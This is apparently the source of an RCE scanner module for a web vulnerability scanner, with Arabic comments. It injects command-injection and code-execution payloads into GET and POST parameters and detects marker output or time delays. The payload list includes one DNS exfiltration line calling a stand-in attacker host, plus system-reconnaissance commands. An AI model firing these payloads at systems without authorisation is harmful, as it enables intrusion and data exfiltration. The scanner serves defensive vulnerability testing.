
import asyncio
import re
import base64
import random
import string
from typing import Dict, List, Optional, Any, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass

from .base_scanner import BaseScanner, ScanContext, Finding, Severity, Confidence

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    import aiohttp

import logging

logger = logging.getLogger(__name__)


@dataclass
class RCEPayload:
    """حمولة RCE"""
    name: str
    payload: str
    technique: str  # cmd, eval, exec, system
    platform: str   # linux, windows, php, python, node, java
    output_indicator: str
    description: str


class RCEScanner(BaseScanner):
    """
    فاحص ثغرات Remote Code Execution (RCE)
    
    الميزات:
    - اكتشاف حقن الأوامر (Command Injection)
    - اكتشاف تنفيذ الكود (Code Execution)
    - دعم منصات متعددة (Linux, Windows)
    - دعم لغات متعددة (PHP, Python, Node, Java)
    - تقنيات تجاوز WAF
    - ترميزات متعددة (Base64, URL, Hex)
    - استخراج مخرجات الأوامر
    """
    
    # قائمة الحمولات الأساسية
    BASE_PAYLOADS = [
        # Linux command injection
        RCEPayload("Linux Basic", "; echo RCE_DETECTED", "cmd", "linux", "RCE_DETECTED", "Basic semicolon injection"),
        RCEPayload("Linux Pipe", "| echo RCE_DETECTED", "cmd", "linux", "RCE_DETECTED", "Pipe operator injection"),
        RCEPayload("Linux AND", "&& echo RCE_DETECTED", "cmd", "linux", "RCE_DETECTED", "AND operator injection"),
        RCEPayload("Linux OR", "|| echo RCE_DETECTED", "cmd", "linux", "RCE_DETECTED", "OR operator injection"),
        RCEPayload("Linux Subshell", "$(echo RCE_DETECTED)", "cmd", "linux", "RCE_DETECTED", "Subshell injection"),
        RCEPayload("Linux Backticks", "`echo RCE_DETECTED`", "cmd", "linux", "RCE_DETECTED", "Backtick injection"),
        RCEPayload("Linux Newline", "%0aecho%20RCE_DETECTED", "cmd", "linux", "RCE_DETECTED", "Newline injection"),
        
        # Windows command injection
        RCEPayload("Windows Basic", "& echo RCE_DETECTED", "cmd", "windows", "RCE_DETECTED", "Windows & operator"),
        RCEPayload("Windows Pipe", "| echo RCE_DETECTED", "cmd", "windows", "RCE_DETECTED", "Windows pipe"),
        RCEPayload("Windows AND", "&& echo RCE_DETECTED", "cmd", "windows", "RCE_DETECTED", "Windows AND"),
        RCEPayload("Windows Newline", "%0Aecho%20RCE_DETECTED", "cmd", "windows", "RCE_DETECTED", "Windows newline"),
        
        # PHP code execution
        RCEPayload("PHP System", "; system('echo RCE_DETECTED');", "eval", "php", "RCE_DETECTED", "PHP system function"),
        RCEPayload("PHP Exec", "; exec('echo RCE_DETECTED');", "eval", "php", "RCE_DETECTED", "PHP exec function"),
        RCEPayload("PHP Eval", "; eval('echo \"RCE_DETECTED\";');", "eval", "php", "RCE_DETECTED", "PHP eval function"),
        RCEPayload("PHP Shell Exec", "; shell_exec('echo RCE_DETECTED');", "eval", "php", "RCE_DETECTED", "PHP shell_exec"),
        RCEPayload("PHP Passthru", "; passthru('echo RCE_DETECTED');", "eval", "php", "RCE_DETECTED", "PHP passthru"),
        
        # Python code execution
        RCEPayload("Python Eval", "; eval(\"print('RCE_DETECTED')\")", "eval", "python", "RCE_DETECTED", "Python eval"),
        RCEPayload("Python Exec", "; exec(\"print('RCE_DETECTED')\")", "eval", "python", "RCE_DETECTED", "Python exec"),
        RCEPayload("Python System", "; os.system('echo RCE_DETECTED')", "eval", "python", "RCE_DETECTED", "Python os.system"),
        RCEPayload("Python Subprocess", "; subprocess.call(['echo','RCE_DETECTED'])", "eval", "python", "RCE_DETECTED", "Python subprocess"),
        
        # Node.js code execution
        RCEPayload("Node Eval", "; eval(\"console.log('RCE_DETECTED')\")", "eval", "node", "RCE_DETECTED", "Node.js eval"),
        RCEPayload("Node Exec", "; require('child_process').exec('echo RCE_DETECTED')", "eval", "node", "RCE_DETECTED", "Node.js exec"),
        
        # Time-based detection
        RCEPayload("Linux Sleep", "; sleep 5", "time", "linux", "", "Time-based detection (5 seconds)"),
        RCEPayload("Windows Ping", "& ping -n 5 127.0.0.1", "time", "windows", "", "Time-based detection (5 seconds)"),
        
        # DNS exfiltration (placeholder)
        RCEPayload("DNS Exfil", "; nslookup $(whoami).attacker.com", "dns", "linux", "", "DNS exfiltration test"),
    ]
    
    # إشارات نجاح RCE
    SUCCESS_INDICATORS = [
        r"RCE_DETECTED",
        r"uid=",
        r"gid=",
        r"groups=",
        r"root:",
        r"daemon:",
        r"www-data:",
    ]
    
    def __init__(
        self,
        rate_limit: float = 0.5,  # أبطأ لثغرات RCE
        timeout: int = 60,  # وقت أطول للطلبات
        max_retries: int = 2,
        time_threshold: float = 4.0,  # ثواني
        test_all_parameters: bool = True,
        detect_output: bool = True
    ):
        super().__init__(
            name="RCEScanner",
            rate_limit=rate_limit,
            timeout=timeout,
            max_retries=max_retries
        )
        self._time_threshold = time_threshold
        self._test_all_parameters = test_all_parameters
        self._detect_output = detect_output
        self._session = None
        self._tested_params: Set[str] = set()
        self._unique_marker = self._generate_marker()
    
    def _generate_marker(self) -> str:
        """توليد علامة فريدة للكشف"""
        return f"RCE_{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    async def _get_session(self):
        """الحصول على جلسة HTTP"""
        if not self._session:
            if HTTPX_AVAILABLE:
                self._session = httpx.AsyncClient(
                    timeout=self.timeout,
                    follow_redirects=True,
                    verify=False
                )
            else:
                self._session = aiohttp.ClientSession()
        return self._session
    
    async def can_scan(self, context: ScanContext) -> bool:
        """التحقق من وجود معاملات قابلة للاختبار"""
        url = context.target.url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        post_params = context.target.data or {}
        
        return len(params) > 0 or len(post_params) > 0
    
    async def scan(self, context: ScanContext) -> List[Finding]:
        """تنفيذ فحص RCE"""
        findings = []
        url = context.target.url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # دمج جميع المعاملات
        all_params = {}
        for key, values in params.items():
            all_params[key] = values[0] if values else ""
        all_params.update(context.target.params)
        
        # معاملات POST
        post_params = context.target.data.copy() if context.target.data else {}
        
        # 1. فحص Command Injection
        cmd_findings = await self._scan_command_injection(
            context, all_params, post_params
        )
        findings.extend(cmd_findings)
        
        # 2. فحص Code Execution
        if not findings:  # إذا لم نجد ثغرة سابقة
            code_findings = await self._scan_code_execution(
                context, all_params, post_params
            )
            findings.extend(code_findings)
        
        # 3. فحص Time-based
        time_findings = await self._scan_time_based(
            context, all_params, post_params
        )
        findings.extend(time_findings)
        
        # 4. استخراج المخرجات إذا تم العثور على ثغرة
        if self._detect_output and findings:
            for finding in findings:
                if finding.confidence == Confidence.HIGH:
                    output = await self._extract_command_output(
                        context, finding.parameter, finding.metadata.get("platform", "linux")
                    )
                    if output:
                        finding.metadata["command_output"] = output
        
        return findings
    
    async def _scan_command_injection(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str]
    ) -> List[Finding]:
        """فحص حقن الأوامر"""
        findings = []
        cmd_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "cmd"]
        
        # تحديث العلامة الفريدة
        marker = self._generate_marker()
        
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            for payload in cmd_payloads:
                # تخصيص الحمولة بالعلامة الفريدة
                custom_payload = payload.payload.replace("RCE_DETECTED", marker)
                
                finding = await self._test_payload(
                    context=context,
                    param_name=param_name,
                    original_value=get_params[param_name],
                    payload=custom_payload,
                    payload_info=payload,
                    method="GET",
                    post_params=post_params,
                    marker=marker
                )
                
                if finding:
                    findings.append(finding)
                    self._tested_params.add(param_name)
                    break
            
            if param_name in self._tested_params:
                continue
        
        # اختبار معاملات POST
        for param_name, param_value in post_params.items():
            if f"POST:{param_name}" in self._tested_params:
                continue
            
            for payload in cmd_payloads:
                custom_payload = payload.payload.replace("RCE_DETECTED", marker)
                
                finding = await self._test_payload(
                    context=context,
                    param_name=param_name,
                    original_value=param_value,
                    payload=custom_payload,
                    payload_info=payload,
                    method="POST",
                    post_params=post_params,
                    marker=marker
                )
                
                if finding:
                    findings.append(finding)
                    self._tested_params.add(f"POST:{param_name}")
                    break
        
        return findings
    
    async def _scan_code_execution(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str]
    ) -> List[Finding]:
        """فحص تنفيذ الكود"""
        findings = []
        code_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "eval"]
        
        marker = self._generate_marker()
        
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            for payload in code_payloads:
                custom_payload = payload.payload.replace("RCE_DETECTED", marker)
                
                finding = await self._test_payload(
                    context=context,
                    param_name=param_name,
                    original_value=get_params[param_name],
                    payload=custom_payload,
                    payload_info=payload,
                    method="GET",
                    post_params=post_params,
                    marker=marker
                )
                
                if finding:
                    findings.append(finding)
                    self._tested_params.add(param_name)
                    break
        
        return findings
    
    async def _scan_time_based(
        self,
        context: ScanContext,
        get_params: Dict[str, str],
        post_params: Dict[str, str]
    ) -> List[Finding]:
        """فحص Time-based RCE"""
        findings = []
        time_payloads = [p for p in self.BASE_PAYLOADS if p.technique == "time"]
        
        for param_name in get_params:
            if param_name in self._tested_params:
                continue
            
            # قياس وقت الاستجابة العادي
            baseline_time = await self._measure_response_time(
                context, param_name, get_params[param_name], post_params
            )
            
            for payload in time_payloads:
                # قياس وقت الاستجابة مع الحمولة
                test_time = await self._measure_response_time(
                    context, param_name, get_params[param_name], post_params, payload.payload
                )
                
                # إذا كان الفرق أكبر من العتبة
                if test_time - baseline_time > self._time_threshold:
                    finding = self.add_finding(
                        vulnerability_type="Remote Code Execution (Time-based)",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        url=context.target.url,
                        parameter=param_name,
                        payload=payload.payload,
                        evidence=f"Time-based detection: {test_time - baseline_time:.2f}s delay",
                        description=f"Time-based RCE discovered using {payload.name} on {payload.platform}",
                        remediation="Avoid using system calls with user input. Use allowlists for commands. Implement strict input validation.",
                        cvss_score=9.8,
                        metadata={
                            "technique": "time",
                            "platform": payload.platform,
                            "delay_seconds": test_time - baseline_time
                        }
                    )
                    findings.append(finding)
                    self._tested_params.add(param_name)
                    break
        
        return findings
    
    async def _test_payload(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        payload: str,
        payload_info: RCEPayload,
        method: str,
        post_params: Dict[str, str],
        marker: str
    ) -> Optional[Finding]:
        """اختبار حمولة RCE واحدة"""
        session = await self._get_session()
        url = context.target.url
        
        # تطبيق ترميزات مختلفة للتجاوز
        encoded_payloads = [
            payload,
            base64.b64encode(payload.encode()).decode(),
            payload.replace(" ", "%20"),
        ]
        
        for encoded_payload in encoded_payloads:
            try:
                if method == "GET":
                    # تعديل معامل GET
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [encoded_payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    
                    if HTTPX_AVAILABLE:
                        response = await session.get(test_url, headers=context.target.headers)
                        body = response.text
                    else:
                        async with session.get(test_url, headers=context.target.headers) as resp:
                            body = await resp.text()
                    
                else:
                    # اختبار POST
                    modified_post = post_params.copy()
                    modified_post[param_name] = encoded_payload
                    
                    if HTTPX_AVAILABLE:
                        response = await session.post(url, data=modified_post, headers=context.target.headers)
                        body = response.text
                    else:
                        async with session.post(url, data=modified_post, headers=context.target.headers) as resp:
                            body = await resp.text()
                
                # التحقق من وجود العلامة في الاستجابة
                if marker in body:
                    # RCE تم اكتشافه!
                    severity = Severity.CRITICAL
                    confidence = Confidence.CERTAIN
                    
                    # استخراج المخرجات
                    output = self._extract_output(body, marker)
                    
                    finding = self.add_finding(
                        vulnerability_type="Remote Code Execution (RCE)",
                        severity=severity,
                        confidence=confidence,
                        url=url,
                        parameter=param_name,
                        payload=payload_info.payload,
                        evidence=f"Command output detected: {output[:200] if output else 'RCE marker found'}",
                        description=f"RCE vulnerability discovered using {payload_info.name} on {payload_info.platform}. Able to execute arbitrary system commands.",
                        remediation="Avoid using system(), exec(), eval() with user input. Use parameterized APIs. Implement strict input validation and sanitization.",
                        cvss_score=9.8,
                        metadata={
                            "technique": payload_info.technique,
                            "platform": payload_info.platform,
                            "command_output": output[:500] if output else None
                        }
                    )
                    return finding
                
                # التحقق من إشارات نجاح أخرى
                for indicator in self.SUCCESS_INDICATORS:
                    if re.search(indicator, body, re.IGNORECASE):
                        finding = self.add_finding(
                            vulnerability_type="Remote Code Execution (RCE)",
                            severity=Severity.CRITICAL,
                            confidence=Confidence.HIGH,
                            url=url,
                            parameter=param_name,
                            payload=payload_info.payload,
                            evidence=f"Success indicator found: {indicator}",
                            description=f"Potential RCE using {payload_info.name}",
                            remediation="Avoid system calls with user input. Use allowlists.",
                            cvss_score=9.8,
                            metadata={"technique": payload_info.technique, "platform": payload_info.platform}
                        )
                        return finding
                
            except Exception as e:
                logger.debug(f"Error testing RCE payload: {e}")
        
        return None
    
    async def _measure_response_time(
        self,
        context: ScanContext,
        param_name: str,
        original_value: str,
        post_params: Dict[str, str],
        payload: str = None
    ) -> float:
        """قياس وقت استجابة الطلب"""
        session = await self._get_session()
        url = context.target.url
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            if payload:
                # إرسال طلب مع الحمولة
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                if HTTPX_AVAILABLE:
                    await session.get(test_url, headers=context.target.headers)
                else:
                    async with session.get(test_url, headers=context.target.headers):
                        pass
            else:
                # طلب عادي (baseline)
                if HTTPX_AVAILABLE:
                    await session.get(url, headers=context.target.headers)
                else:
                    async with session.get(url, headers=context.target.headers):
                        pass
                        
        except Exception:
            pass
        
        return asyncio.get_event_loop().time() - start_time
    
    def _extract_output(self, body: str, marker: str) -> Optional[str]:
        """استخراج مخرجات الأمر من الاستجابة"""
        # البحث عن العلامة وما حولها
        patterns = [
            rf'{marker}\s*:\s*(.+?)(?:\n|$)',
            rf'(.+?){marker}',
            rf'{marker}(.+?)(?:\n|$)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body, re.DOTALL | re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        return None
    
    async def _extract_command_output(
        self,
        context: ScanContext,
        param_name: str,
        platform: str
    ) -> Optional[str]:
        """استخراج مخرجات الأمر باستخدام أمر مخصص"""
        # أوامر لاستخراج معلومات النظام
        extraction_commands = {
            "linux": [
                "; echo START_MARKER && id && echo END_MARKER",
                "; echo START_MARKER && whoami && echo END_MARKER",
                "; echo START_MARKER && pwd && echo END_MARKER",
                "; echo START_MARKER && ls -la && echo END_MARKER",
            ],
            "windows": [
                "& echo START_MARKER & whoami & echo END_MARKER",
                "& echo START_MARKER & cd & echo END_MARKER",
                "& echo START_MARKER & dir & echo END_MARKER",
            ]
        }
        
        commands = extraction_commands.get(platform, extraction_commands["linux"])
        
        for cmd in commands:
            # إرسال الأمر وحفظ المخرجات
            # (سيتم تنفيذه في الإصدارات القادمة)
            pass
        
        return None
    
    async def close(self):
        """إغلاق الجلسة"""
        if self._session:
            if HTTPX_AVAILABLE:
                await self._session.aclose()
            else:
                await self._session.close()
            self._session = None

